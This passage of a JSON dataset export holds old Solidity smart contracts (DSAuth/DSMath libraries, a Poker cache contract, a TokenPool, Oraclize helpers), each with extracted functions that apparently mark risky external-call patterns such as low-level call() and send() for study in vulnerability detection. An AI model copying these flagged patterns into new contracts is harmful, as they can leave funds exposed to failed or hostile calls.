wmul(uint128 x, uint128 y) constant internal returns (uint128 z) {\n z = cast((uint256(x) * y + WAD / 2) / WAD);\n }\n function wdiv(uint128 x, uint128 y) constant internal returns (uint128 z) {\n z = cast((uint256(x) * WAD + y / 2) / y);\n }\n function wmin(uint128 x, uint128 y) constant internal returns (uint128) {\n return hmin(x, y);\n }\n function wmax(uint128 x, uint128 y) constant internal returns (uint128) {\n return hmax(x, y);\n }\n uint128 constant RAY = 10 ** 27;\n function radd(uint128 x, uint128 y) constant internal returns (uint128) {\n return hadd(x, y);\n }\n function rsub(uint128 x, uint128 y) constant internal returns (uint128) {\n return hsub(x, y);\n }\n function rmul(uint128 x, uint128 y) constant internal returns (uint128 z) {\n z = cast((uint256(x) * y + RAY / 2) / RAY);\n }\n function rdiv(uint128 x, uint128 y) constant internal returns (uint128 z) {\n z = cast((uint256(x) * RAY + y / 2) / y);\n }\n function rpow(uint128 x, uint64 n) constant internal returns (uint128 z) {\n z = n % 2 != 0 ? x : RAY;\n for (n /= 2; n != 0; n /= 2) {\n x = rmul(x, x);\n if (n % 2 != 0) {\n z = rmul(z, x);\n }\n }\n }\n function rmin(uint128 x, uint128 y) constant internal returns (uint128) {\n return hmin(x, y);\n }\n function rmax(uint128 x, uint128 y) constant internal returns (uint128) {\n return hmax(x, y);\n }\n function cast(uint256 x) constant internal returns (uint128 z) {\n assert((z = uint128(x)) == x);\n }\n}\ncontract DSThing is DSAuth, DSNote, DSMath {\n}\ncontract DSValue is DSThing {\n bool has;\n bytes32 val;\n function peek() constant returns (bytes32, bool) {\n return (val,has);\n }\n function read() constant returns (bytes32) {\n var (wut, has) = peek();\n assert(has);\n return wut;\n }\n function poke(bytes32 wut) note auth {\n val = wut;\n has = true;\n }\n function void() note auth {\n has = false;\n }\n}\ncontract DSCache is DSValue\n{\n uint128 public zzz;\n function peek() constant returns (bytes32, bool) {\n return (val, has && now < zzz);\n }\n function read() constant returns (bytes32) {\n var (wut, has) = peek();\n assert(now < zzz);\n assert(has);\n return wut;\n }\n function prod(bytes32 wut, uint128 Zzz) note auth {\n zzz = Zzz;\n poke(wut);\n }\n}\ncontract Poker is DSCache {\n function poke(address med, bytes32 wut) auth {\n super.poke(wut);\n assert(med.call(bytes4(sha3(\"poke()\"))));\n }\n function prod(address med, bytes32 wut, uint128 zzz) auth {\n super.prod(wut, zzz);\n assert(med.call(bytes4(sha3(\"poke()\"))));\n }\n}",
  "extract_feature": [
    "function poke(address med, bytes32 wut) auth {\nsuper.poke(wut);\nassert(med.call(bytes4(sha3(\"poke()\"))));\n}",
    "function prod(address med, bytes32 wut, uint128 zzz) auth {\nsuper.prod(wut, zzz);\nassert(med.call(bytes4(sha3(\"poke()\"))));\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb1626"
  },
  "filename": "38923.sol",
  "content": "pragma solidity ^0.4.11;\ncontract DSAuthority {\n function canCall(\n address src, address dst, bytes4 sig\n ) constant returns (bool);\n}\ncontract DSAuthEvents {\n event LogSetAuthority (address indexed authority);\n event LogSetOwner (address indexed owner);\n}\ncontract DSAuth is DSAuthEvents {\n DSAuthority public authority;\n address public owner;\n function DSAuth() {\n owner = msg.sender;\n LogSetOwner(msg.sender);\n }\n function setOwner(address owner_)\n auth\n {\n owner = owner_;\n LogSetOwner(owner);\n }\n function setAuthority(DSAuthority authority_)\n auth\n {\n authority = authority_;\n LogSetAuthority(authority);\n }\n modifier auth {\n assert(isAuthorized(msg.sender, msg.sig));\n _;\n }\n modifier authorized(bytes4 sig) {\n assert(isAuthorized(msg.sender, sig));\n _;\n }\n function isAuthorized(address src, bytes4 sig) internal returns (bool) {\n if (src == address(this)) {\n return true;\n } else if (src == owner) {\n return true;\n } else if (authority == DSAuthority(0)) {\n return false;\n } else {\n return authority.canCall(src, this, sig);\n }\n }\n function assert(bool x) internal {\n if (!x) throw;\n }\n}\ncontract DSNote {\n event LogNote(\n bytes4 indexed sig,\n address indexed guy,\n bytes32 indexed foo,\n bytes32 indexed bar,\n uint wad,\n bytes fax\n ) anonymous;\n modifier note {\n bytes32 foo;\n bytes32 bar;\n assembly {\n foo := calldataload(4)\n bar := calldataload(36)\n }\n LogNote(msg.sig, msg.sender, foo, bar, msg.value, msg.data);\n _;\n }\n}\ncontract DSMath {\n function add(uint256 x, uint256 y) constant internal returns (uint256 z) {\n assert((z = x + y) >= x);\n }\n function sub(uint256 x, uint256 y) constant internal returns (uint256 z) {\n assert((z = x - y) <= x);\n }\n function mul(uint256 x, uint256 y) constant internal returns (uint256 z) {\n z = x * y;\n assert(x == 0 || z / x == y);\n }\n function div(uint256 x, uint256 y) constant internal returns (uint256 z) {\n z = x / y;\n }\n function min(uint256 x, uint256 y) constant internal returns (uint256 z) {\n return x <= y ? x : y;\n }\n function max(uint256 x, uint256 y) constant internal returns (uint256 z) {\n return x >= y ? x : y;\n }\n function hadd(uint128 x, uint128 y) constant internal returns (uint128 z) {\n assert((z = x + y) >= x);\n }\n function hsub(uint128 x, uint128 y) constant internal returns (uint128 z) {\n assert((z = x - y) <= x);\n }\n function hmul(uint128 x, uint128 y) constant internal returns (uint128 z) {\n z = x * y;\n assert(x == 0 || z / x == y);\n }\n function hdiv(uint128 x, uint128 y) constant internal returns (uint128 z) {\n z = x / y;\n }\n function hmin(uint128 x, uint128 y) constant internal returns (uint128 z) {\n return x <= y ? x : y;\n }\n function hmax(uint128 x, uint128 y) constant internal returns (uint128 z) {\n return x >= y ? x : y;\n }\n function imin(int256 x, int256 y) constant internal returns (int256 z) {\n return x <= y ? x : y;\n }\n function imax(int256 x, int256 y) constant internal returns (int256 z) {\n return x >= y ? x : y;\n }\n uint128 constant WAD = 10 ** 18;\n function wadd(uint128 x, uint128 y) constant internal returns (uint128) {\n return hadd(x, y);\n }\n function wsub(uint128 x, uint128 y) constant internal returns (uint128) {\n return hsub(x, y);\n }\n function wmul(uint128 x, uint128 y) constant internal returns (uint128 z) {\n z = cast((uint256(x) * y + WAD / 2) / WAD);\n }\n function wdiv(uint128 x, uint128 y) constant internal returns (uint128 z) {\n z = cast((uint256(x) * WAD + y / 2) / y);\n }\n function wmin(uint128 x, uint128 y) constant internal returns (uint128) {\n return hmin(x, y);\n }\n function wmax(uint128 x, uint128 y) constant internal returns (uint128) {\n return hmax(x, y);\n }\n uint128 constant RAY = 10 ** 27;\n function radd(uint128 x, uint128 y) constant internal returns (uint128) {\n return hadd(x, y);\n }\n function rsub(uint128 x, uint128 y) constant internal returns (uint128) {\n return hsub(x, y);\n }\n function rmul(uint128 x, uint128 y) constant internal returns (uint128 z) {\n z = cast((uint256(x) * y + RAY / 2) / RAY);\n }\n function rdiv(uint128 x, uint128 y) constant internal returns (uint128 z) {\n z = cast((uint256(x) * RAY + y / 2) / y);\n }\n function rpow(uint128 x, uint64 n) constant internal returns (uint128 z) {\n z = n % 2 != 0 ? x : RAY;\n for (n /= 2; n != 0; n /= 2) {\n x = rmul(x, x);\n if (n % 2 != 0) {\n z = rmul(z, x);\n }\n }\n }\n function rmin(uint128 x, uint128 y) constant internal returns (uint128) {\n return hmin(x, y);\n }\n function rmax(uint128 x, uint128 y) constant internal returns (uint128) {\n return hmax(x, y);\n }\n function cast(uint256 x) constant internal returns (uint128 z) {\n assert((z = uint128(x)) == x);\n }\n}\ncontract DSThing is DSAuth, DSNote, DSMath {\n}\ncontract DSValue is DSThing {\n bool has;\n bytes32 val;\n function peek() constant returns (bytes32, bool) {\n return (val,has);\n }\n function read() constant returns (bytes32) {\n var (wut, has) = peek();\n assert(has);\n return wut;\n }\n function poke(bytes32 wut) note auth {\n val = wut;\n has = true;\n }\n function void() note auth {\n has = false;\n }\n}\ncontract DSCache is DSValue\n{\n uint128 public zzz;\n function peek() constant returns (bytes32, bool) {\n return (val, has && now < zzz);\n }\n function read() constant returns (bytes32) {\n var (wut, has) = peek();\n assert(now < zzz);\n assert(has);\n return wut;\n }\n function prod(bytes32 wut, uint128 Zzz) note auth {\n zzz = Zzz;\n poke(wut);\n }\n}\ncontract Poker is DSCache {\n function poke(address med, bytes32 wut) auth {\n super.poke(wut);\n assert(med.call(bytes4(sha3(\"poke()\"))));\n }\n function prod(address med, bytes32 wut, uint128 zzz) auth {\n super.prod(wut, zzz);\n assert(med.call(bytes4(sha3(\"poke()\"))));\n }\n}",
  "extract_feature": [
    "function poke(address med, bytes32 wut) auth {\nsuper.poke(wut);\nassert(med.call(bytes4(sha3(\"poke()\"))));\n}",
    "function prod(address med, bytes32 wut, uint128 zzz) auth {\nsuper.prod(wut, zzz);\nassert(med.call(bytes4(sha3(\"poke()\"))));\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb1627"
  },
  "filename": "39019.sol",
  "content": "pragma solidity ^0.4.10;\ncontract ERC20 {\n function balanceOf(address owner) constant returns (uint balance);\n function transfer(address to, uint value) returns (bool success);\n}\ncontract TokenPool {\n string public name;\n uint public fundingLimit;\n uint public rewardPercentage;\n uint public amountRaised;\n uint public tokensCreated;\n ERC20 public tokenContract;\n address public tokenCreateContract;\n string public tokenCreateFunction;\n mapping (address => uint) funders;\n address public tokenCreator;\n bytes4 tokenCreateFunctionHash;\n function TokenPool(\n TokenPoolList list,\n string _name,\n uint _fundingLimit,\n uint _rewardPercentage,\n ERC20 _tokenContract,\n address _tokenCreateContract,\n string _tokenCreateFunction)\n {\n list.add(this);\n name = _name;\n fundingLimit = _fundingLimit;\n rewardPercentage = _rewardPercentage;\n tokenContract = _tokenContract;\n tokenCreateContract = _tokenCreateContract;\n tokenCreateFunction = _tokenCreateFunction;\n tokenCreateFunctionHash = bytes4(sha3(tokenCreateFunction));\n }\n function Fund() payable {\n if (tokensCreated > 0) throw;\n uint amount = msg.value;\n amountRaised += amount;\n if (amountRaised > fundingLimit) throw;\n funders[msg.sender] += amount;\n }\n function() payable {\n Fund();\n }\n function Withdraw() {\n if (tokensCreated > 0) return;\n uint amount = funders[msg.sender];\n if (amount == 0) return;\n funders[msg.sender] -= amount;\n amountRaised -= amount;\n if (!msg.sender.send(amount)) {\n funders[msg.sender] += amount;\n amountRaised += amount;\n }\n }\n function CreateTokens() {\n if (tokensCreated > 0) return;\n uint amount = amountRaised * (100 - rewardPercentage) / 100;\n if (!tokenCreateContract.call.value(amount)(tokenCreateFunctionHash)) throw;\n tokensCreated = tokenContract.balanceOf(this);\n tokenCreator = msg.sender;\n }\n function ClaimTokens() {\n if (tokensCreated == 0) return;\n uint amount = funders[msg.sender];\n if (amount == 0) return;\n uint tokens = tokensCreated * amount / amountRaised;\n funders[msg.sender] = 0;\n if (!tokenContract.transfer(msg.sender, tokens)) {\n funders[msg.sender] = amount;\n }\n }\n function ClaimReward() {\n if (msg.sender != tokenCreator) return;\n uint amount = amountRaised * (100 - rewardPercentage) / 100;\n uint reward = amountRaised - amount;\n if (msg.sender.send(reward)) {\n tokenCreator = 0;\n }\n }\n}\npragma solidity ^0.4.10;\ncontract TokenPoolList {\n address[] public list;\n event Added(address x);\n function add(address x) {\n list.push(x);\n Added(x);\n }\n function getCount() public constant returns(uint) {\n return list.length;\n }\n function getAddress(uint index) public constant returns(address) {\n return list[index];\n }\n}",
  "extract_feature": [
    "function Withdraw() {\nif (tokensCreated > 0) return;\nuint amount = funders[msg.sender];\nif (amount == 0) return;\nfunders[msg.sender] -= amount;\namountRaised -= amount;\nif (!msg.sender.send(amount)) {\nfunders[msg.sender] += amount;\namountRaised += amount;\n}\n}",
    "function ClaimReward() {\nif (msg.sender != tokenCreator) return;\nuint amount = amountRaised * (100 - rewardPercentage) / 100;\nuint reward = amountRaised - amount;\nif (msg.sender.send(reward)) {\ntokenCreator = 0;\n}\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb1628"
  },
  "filename": "39060.sol",
  "content": "pragma solidity ^0.4.11;\npragma solidity ^0.4.0;\ncontract OraclizeI {\n address public cbAddress;\n function query(uint _timestamp, string _datasource, string _arg) payable returns (bytes32 _id);\n function query_withGasLimit(uint _timestamp, string _datasource, string _arg, uint _gaslimit) payable returns (bytes32 _id);\n function query2(uint _timestamp, string _datasource, string _arg1, string _arg2) payable returns (bytes32 _id);\n function query2_withGasLimit(uint _timestamp, string _datasource, string _arg1, string _arg2, uint _gaslimit) payable returns (bytes32 _id);\n function queryN(uint _timestamp, string _datasource, bytes _argN) payable returns (bytes32 _id);\n function queryN_withGasLimit(uint _timestamp, string _datasource, bytes _argN, uint _gaslimit) payable returns (bytes32 _id);\n function getPrice(string _datasource) returns (uint _dsprice);\n function getPrice(string _datasource, uint gaslimit) returns (uint _dsprice);\n function useCoupon(string _coupon);\n function setProofType(byte _proofType);\n function setConfig(bytes32 _config);\n function setCustomGasPrice(uint _gasPrice);\n function randomDS_getSessionPubKeyHash() returns(bytes32);\n}\ncontract OraclizeAddrResolverI {\n function getAddress() returns (address _addr);\n}\ncontract usingOraclize {\n uint constant day = 60*60*24;\n uint constant week = 60*60*24*7;\n uint constant month = 60*60*24*30;\n byte constant proofType_NONE = 0x00;\n byte constant proofType_TLSNotary = 0x10;\n byte constant proofType_Android = 0x20;\n byte constant proofType_Ledger = 0x30;\n byte constant proofType_Native = 0xF0;\n byte constant proofStorage_IPFS = 0x01;\n uint8 constant networkID_auto = 0;\n uint8 constant networkID_mainnet = 1;\n uint8 constant networkID_testnet = 2;\n uint8 constant networkID_morden = 2;\n uint8 constant networkID_consensys = 161;\n OraclizeAddrResolverI OAR;\n OraclizeI oraclize;\n modifier oraclizeAPI {\n if((address(OAR)==0)||(getCodeSize(address(OAR))==0)) oraclize_setNetwork(networkID_auto);\n oraclize = OraclizeI(OAR.getAddress());\n _;\n }\n modifier coupon(string code){\n oraclize = OraclizeI(OAR.getAddress());\n oraclize.useCoupon(code);\n _;\n }\n function oraclize_setNetwork(uint8 networkID) internal returns(bool){\n if (getCodeSize(0x1d3B2638a7cC9f2CB3D298A3DA7a90B67E5506ed)>0){\n OAR = OraclizeAddrResolverI(0x1d3B2638a7cC9f2CB3D298A3DA7a90B67E5506ed);\n oraclize_setNetworkName(\"eth_mainnet\");\n return true;\n }\n if (getCodeSize(0xc03A2615D5efaf5F49F60B7BB6583eaec212fdf1)>0){\n OAR = OraclizeAddrResolverI(0xc03A2615D5efaf5F49F60B7BB6583eaec212fdf1);\n oraclize_setNetworkName(\"eth_ropsten3\");\n return true;\n }\n if (getCodeSize(0xB7A07BcF2Ba2f2703b24C0691b5278999C59AC7e)>0){\n OAR = OraclizeAddrResolverI(0xB7A07BcF2Ba2f2703b24C0691b5278999C59AC7e);\n oraclize_setNetworkName(\"eth_kovan\");\n return true;\n }\n if (getCodeSize(0x146500cfd35B22E4A392Fe0aDc06De1a1368Ed48)>0){\n OAR = OraclizeAddrResolverI(0x146500cfd35B22E4A392Fe0aDc06De1a1368Ed48);\n oraclize_setNetworkName(\"eth_rinkeby\");\n return true;\n }\n if (getCodeSize(0x6f485C8BF6fc43eA212E93BBF8ce046C7f1cb475)>0){\n OAR = OraclizeAddrResolverI(0x6f485C8BF6fc43eA212E93BBF8ce046C7f1cb475);\n return true;\n }\n if (getCodeSize(0x20e12A1F859B3FeaE5Fb2A0A32C18F5a65555bBF)>0){\n OAR = OraclizeAddrResolverI(0x20e12A1F859B3FeaE5Fb2A0A32C18F5a65555bBF);\n return true;\n }\n if (getCodeSize(0x51efaF4c8B3C9AfBD5aB9F4bbC82784Ab6ef8fAA)>0){\n OAR = OraclizeAddrResolverI(0x51efaF4c8B3C9AfBD5aB9F4bbC82784Ab6ef8fAA);\n return true;\n }\n return false;\n }\n function __callback(bytes32 myid, string result) {\n __callback(myid, result, new bytes(0));\n }\n function __callback(bytes32 myid, string result, bytes proof) {\n }\n function oraclize_useCoupon(string code) oraclizeAPI internal {\n oraclize.useCoupon(code);\n }\n function oraclize_getPrice(string datasource) oraclizeAPI internal returns (uint){\n return oraclize.getPrice(datasource);\n }\n function oraclize_getPrice(string datasource, uint gaslimit) oraclizeAPI internal returns (uint){\n return oraclize.getPrice(datasource, gaslimit);\n }\n function oraclize_query(string datasource, string arg) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n return oraclize.query.value(price)(0, datasource, arg);\n }\n function oraclize_query(uint timestamp, string datasource, string arg) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n return oraclize.query.value(price)(timestamp, datasource, arg);\n }\n function oraclize_query(uint timestamp, string datasource, string arg, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n return oraclize.query_withGasLimit.value(price)(timestamp, datasource, arg, gaslimit);\n }\n function oraclize_query(string datasource, string arg, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n return oraclize.query_withGasLimit.value(price)(0, datasource, arg, gaslimit);\n }\n function oraclize_query(string datasource, string arg1, string arg2) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n return oraclize.query2.value(price)(0, datasource, arg1, arg2);\n }\n function oraclize_query(uint timestamp, string datasource, string arg1, string arg2) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n return oraclize.query2.value(price)(timestamp, datasource, arg1, arg2);\n }\n function oraclize_query(uint timestamp, string datasource, string arg1, string arg2, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n return oraclize.query2_withGasLimit.value(price)(timestamp, datasource, arg1, arg2, gaslimit);\n }\n function oraclize_query(string datasource, string arg1, string arg2, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n return oraclize.query2_withGasLimit.value(price)(0, datasource, arg1, arg2, gaslimit);\n }\n function oraclize_query(string datasource, string[] argN) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n bytes memory args = stra2cbor(argN);\n return oraclize.queryN.value(price)(0, datasource, args);\n }\n function oraclize_query(uint timestamp, string datasource, string[] argN) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n bytes memory args = stra2cbor(argN);\n return oraclize.queryN.value(price)(timestamp, datasource, args);\n }\n function oraclize_query(uint timestamp, string datasource, string[] argN, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n bytes memory args = stra2cbor(argN);\n return oraclize.queryN_withGasLimit.value(price)(timestamp, datasource, args, gaslimit);\n }\n function oraclize_query(string datasource, string[] argN, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n bytes memory args = stra2cbor(argN);\n return oraclize.queryN_withGasLimit.value(price)(0, datasource, args, gaslimit);\n }\n function oraclize_query(string datasource, string[1] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](1);\n dynargs[0] = args[0];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[1] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](1);\n dynargs[0] = args[0];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[1] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](1);\n dynargs[0] = args[0];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[1] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](1);\n dynargs[0] = args[0];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[2] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[2] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[2] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[2] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[3] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[3] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[3] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[3] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[4] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[4] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[4] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[4] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[5] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[5] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[5] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[5] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[] argN) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n bytes memory args = ba2cbor(argN);\n return oraclize.queryN.value(price)(0, datasource, args);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[] argN) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n bytes memory args = ba2cbor(argN);\n return oraclize.queryN.value(price)(timestamp, datasource, args);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[] argN, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n bytes memory args = ba2cbor(argN);\n return oraclize.queryN_withGasLimit.value(price)(timestamp, datasource, args, gaslimit);\n }\n function oraclize_query(string datasource, bytes[] argN, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n bytes memory args = ba2cbor(argN);\n return oraclize.queryN_withGasLimit.value(price)(0, datasource, args, gaslimit);\n }\n function oraclize_query(string datasource, bytes[1] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](1);\n dynargs[0] = args[0];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[1] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](1);\n dynargs[0] = args[0];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[1] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](1);\n dynargs[0] = args[0];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[1] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](1);\n dynargs[0] = args[0];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[2] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[2] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[2] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[2] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[3] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[3] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[3] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[3] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[4] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[4] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n 